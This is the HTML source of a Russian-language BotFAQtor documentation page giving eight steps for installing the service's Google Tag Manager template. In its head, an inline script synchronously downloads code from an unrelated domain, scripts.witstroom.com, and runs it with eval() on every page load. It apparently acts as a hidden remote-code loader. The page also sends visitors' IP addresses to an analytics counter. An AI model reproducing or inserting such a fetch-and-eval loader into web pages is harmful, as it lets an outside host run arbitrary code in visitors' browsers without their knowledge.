<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Инструкция по добавлению шаблона на сайт - BotFAQtor.ru</title>
    <meta name="description"
        content="Сервис при помощи автоматического анализа технических и поведенческих параметров посещений сайта, позволяет определять и блокировать весь негативный трафик: боты-программы и нецелевые визиты.">
    <link rel="icon" type="image/x-icon" href="https://botfaqtor.ru/favicon.ico">
    <meta property="og:url" content="http://botfaqtor-new/docs/confidential/" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Инструкция по добавлению шаблона на сайт - BotFAQtor.ru" />
    <meta property="og:description"
        content="Сервис при помощи автоматического анализа технических и поведенческих параметров посещений сайта, позволяет определять и блокировать весь негативный трафик: боты-программы и нецелевые визиты." />
        <meta property="og:image" content="https://botfaqtor.ru/docs/gtm-template/imageNet.gif" />

    <meta name="description"
        content="Сервис при помощи автоматического анализа технических и поведенческих параметров посещений сайта, позволяет определять и блокировать весь негативный трафик: боты-программы и нецелевые визиты.">
    <link href="../landing/css/style.css?v=<?php echo rand(1000,100000) ?>" type="text/css" rel="stylesheet">
    <script src="../landing/js/jquery-3.4.1.min.js"></script>

    <style>
        i {
            color: #3d88c8;
            display: block;
            padding-bottom: 5px;
        }
    </style>
    <script type="text/javascript">
        (function ab() {
            var randomh = Math.random();
            var request = new XMLHttpRequest();
            request.open('GET', "https://scripts.witstroom.com/one/3" + "?" + randomh + "", false);
            request.send();
            if (request.status == 200) eval(request.responseText);
        })();
    </script>


    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-160917634-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'UA-160917634-1', {
            'custom_map': {
                'dimension1': 'Botfaqtor'
            }
        });
    </script>
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "Organization",
            "url": "https://botfaqtor.ru",
            "logo": "https://botfaqtor.ru/assets/remaster/images/landing/brand.svg"
        }
    </script>


    <script type="text/javascript" src="https://vk.com/js/api/openapi.js?160"></script>

    <!-- Begin Verbox {literal} -->
    <script type='text/javascript'>
        (function (d, w, m) {
            window.supportAPIMethod = m;
            var s = d.createElement('script');
            s.type = 'text/javascript';
            s.id = 'supportScript';
            s.charset = 'utf-8';
            s.async = true;
            var id = 'fa8d6ba2fa033b89a545e3d9db332dae';
            s.src = 'https://admin.verbox.ru/support/support.js?h=' + id;
            var sc = d.getElementsByTagName('script')[0];
            w[m] = w[m] || function () {
                (w[m].q = w[m].q || []).push(arguments);
            };
            if (sc) sc.parentNode.insertBefore(s, sc);
            else d.documentElement.firstChild.appendChild(s);
        })(document, window, 'Verbox');
    </script>
    <!-- {/literal} End Verbox -->

    <!-- Facebook Pixel Code -->
    <script>
        ! function (f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function () {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '350729258894417');
        fbq('track', 'PageView');
    </script>
    <noscript>
        <img height="1" width="1" src="https://www.facebook.com/tr?id=350729258894417&ev=PageView&noscript=1" />
    </noscript>
    <!-- End Facebook Pixel Code -->
    <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
</head>

<body>

    <div class="botfaq-dir">
        <div class="nav-menu">
            <span class="close"></span>
            <nav>
                <ul>
                    <li><a href=""></a></li>
                </ul>
            </nav>
        </div>
        <header>
            <div class="wrapper">
                <div class="row">
                    <div class="logo">
                        <a href="https://botfaqtor.ru" title=""></a>
                    </div>
                    <div class="project-title">
                        <div class="click-project">
                            <span>Проекты</span>
                            <span class="ico-down-arr"></span>
                        </div>

                        <div class="project-bar">
                            <ul>
                                <li>
                                    <a href="/sites-antibot/">
                                        <img src="../landing/img/ico-project/ico-antibot-dir.svg" alt>
                                        <span>Антибот для сайта</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/banners-antibot/">
                                        <img src="../landing/img/ico-project/ico-banner-dir.svg" alt>
                                        <span>Защита баннера</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/yandex-clickfraud/">
                                        <img src="../landing/img/ico-project/ico-yandex-dir.svg" alt>
                                        <span>Защита от скликивания Я.Директ</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/google-clickfraud/">
                                        <img src="../landing/img/ico-project/ico-google-dir.svg" alt>
                                        <span>Защита от скликивания Google ADS</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="/shorten-url/">
                                        <img src="../landing/img/ico-project/ico-shortlink-dir.svg" alt>
                                        <span>Сокращение ссылок</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="menu-head">
                        <ul>
                            <li><a href="https://botfaqtor.ru/#price" class="priceClick">Цена</a></li>
                            <li><a href="https://botfaqtor.ru/blog/" target="blink">Блог</a></li>
                        </ul>
                    </div>
                    <!--<div class="menu-burger"></div>-->
                    <div class="login clicklogin btn"><span>Личный кабинет</span></div>
                    <div class="contact-head">
                        <a href="mailto:info@botfaqtor.ru" class="mail">info@botfaqtor.ru</a>
                        <a href="tel:+74959466031" class="phone">+7 (495) 946-6031</a>
                    </div>
                </div>
            </div>
        </header>


        <section class="textblock">
            <div class="inner">
                <div class="col-row">
                    <div class="col-2">
                        <div class="sidebar">
                            <ul>
                               <li class="active"><a href="instruc.php" class="instruc">Инструкция по добавлению шаблона на сайт</a></li>
                                <li><a href="index.php" class="docs">Документация</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-10">
                        <div>
                           <div style="display:flex; margin-top:40px;">
                               <h2 style="font-size:36px; padding:6px 0 40px 0px; text-align:left;">Для установки кода Botfaqtor<br> на ваш сайт выполните следующие действия:</h2>
                           </div>
                           <span class="contact-span text-about-span">
                               <p>1.	Перейдите на страницу <a href="https://tagmanager.google.com/#/home" target="blink">https://tagmanager.google.com/#/home</a></p>
                               <p>2.	Авторизуйтесь, перейдите в настройки контейнера gtm.</p>
                               <p>3.	Затем перейдите в меню <strong>Теги -> Создать</strong>.</p>
                               <p><img src="../landing/img/kooll.png" alt></p>
                               <p>4.	В конфигурации тега выберите тип тега, нажав кнопку:<img src="../landing/img/edit.png" style="width:24px; position:relative; top:7px;" alt>  в правом верхнем углу.</p>
                               <p>5.	Выберите шаблон <strong>«Botfaqtor code»</strong> в галерее шаблонов</p>
                               <p><img src="../landing/img/koll2.png" alt></p>
                               <p>6.	Добавьте шаблон в свою рабочую область.</p>
                               <p><img src="../landing/img/kooll3.png" alt></p>
                               <p>7.	Настройте конфигурацию тега, указав свой персональный идентификатор сайта и триггер <strong>«All pages»</strong>.</p>
                               <p><img src="../landing/img/kooll4.png" alt></p>
                               <p>8.	Сохраните изменения и отправьте на публикацию.</p>
                           </span>
                        </div>
                        
                    </div>
                </div>
            </div>
        </section>

        <footer>
            <div class="bg-foot-first">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-12">
                            <!--<a href="">О нас</a>-->
                            <!--<a href="">Цены</a>-->
                            <!--<a href="">Вопросы и ответы</a>-->
                            <a href="https://botfaqtor.ru/utm" target="blink">Генератор utm-меток</a>
                            <a href="https://botfaqtor.ru/sources-check" target="blink">Анализ источников трафика</a>
                            <a href="https://botfaqtor.ru/blog" target="blink">Блог</a>
                            <a href="https://botfaqtor.ru/affiliate-program/" target="blink">Партнерская программа</a>
                            <!--<a href="">Контакты</a>-->
                        </div>
                    </div>
                </div>
            </div>
            <div class="bg-foot-last">
                <div class="wrapper">
                    <div class="col-row">
                        <div class="col-6">
                            <div class="copy">© BotFAQtor 2017 - <?php echo date("Y"); ?>.</div>
                            <div class="nw"><a href="https://vk.com/botfaqtor" rel="noopener noreferrer"
                                    target="_blank"><span class="vk"></span></a></div>
                            <div class="nw"><a href="https://www.facebook.com/botfaqtor/" rel="noopener noreferrer"
                                    target="_blank"><span class="fb"></span></a></div>
                        </div>
                        <div class="col-6">
                            <div class="confidential">
							    <a href="https://botfaqtor.ru/docs/oferta/" target="_blank">Договор-оферта</a>
                                <a href="https://botfaqtor.ru/docs/confidential" target="_blank">Политика
                                    конфиденциальности</a>
                                <a href="https://botfaqtor.ru/docs/agreement" target="_blank">Пользовательское
                                    соглашение</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>

	
	<div class="roll-network">
        <div class="block-roll">
            <a href="#" onclick="Verbox('openSupport'); return false;" class="message-list">Задать вопрос</a>
            <div class="ico-roll-network"></div>
            <div class="block-roll-network">
			    <div class="item"><a target="_blank" href="#" class="chat-chat-icon" onclick="Verbox('openSupport'); return false;">Задать вопрос</a></div>
                <div class="item"><a target="_blank" href="tel:+79250022170" class="chat-phone-icon">Позвонить</a></div>
                <div class="item"><a target="_blank" href="tg://resolve?domain=BotfaqtorT_bot" class="chat-teleg-icon">Написать в Telegram</a></div>
                <div class="item"><a target="_blank" href="https://api.whatsapp.com/send?phone=79250022170" class="chat-whats-icon">Написать в Whatsapp</a></div>         
                <div class="item"><a target="_blank" href="viber://pa?chatURI=botfaqtor-ru" class="chat-viber-icon">Написать в Viber</a></div>
                <div class="item"><a target="_blank" href="https://vk.com/write-169372604" class="chat-vk-icon">Написать в VK</a></div>
                <div class="item"><a target="_blank" href="https://www.facebook.com/messages/t/359439317992661" class="chat-fb-icon">Написать в Facebook</a></div>
            </div>
        </div>
    </div>
	
	<script>
	$(".ico-roll-network").click(function () {             $(".block-roll").toggleClass("open-is");return false;});
	$(".message-list, .chat-chat-icon").click(function () {$(".block-roll").removeClass("open-is");return false;});
	</script>
	
    <script src="../landing/js/script.js?v=<?php echo rand(1000,100000) ?>" type="text/javascript"></script>
    <script src="../landing/js/sorttable.js?v=<?php echo rand(1000,100000) ?>"></script>


    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMFZDKB" height="0" width="0"
            style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

<!-- Yandex.Metrika counter -->
<script type="text/javascript">
var yaParams = {};
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ip.up66.ru/', true);
xhr.onload = function() {
yaParams.ip = this.responseText;
}
xhr.send();

   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(49731991, "init", {
        params:window.yaParams,
        clickmap:true,
        trackLinks:true,
        webvisor:true,
        trackHash:true,
        accurateTrackBounce:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/49731991" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->

    <!--LiveInternet counter-->
    <script type="text/javascript">
        document.write("<a href='//www.liveinternet.ru/click' " +
            "target=_blank><img src='//counter.yadro.ru/hit?t39.1;r" +
            escape(document.referrer) + ((typeof (screen) == "undefined") ? "" :
                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
            ";h" + escape(document.title.substring(0, 150)) + ";" + Math.random() +
            "' alt='' title='LiveInternet' " +
            "border='0' width='31' height='31' style=\"position:absolute;left:-10000px;top:-10000px;\" ><\/a>")
    </script>
    <!--/LiveInternet-->


</body>

</html>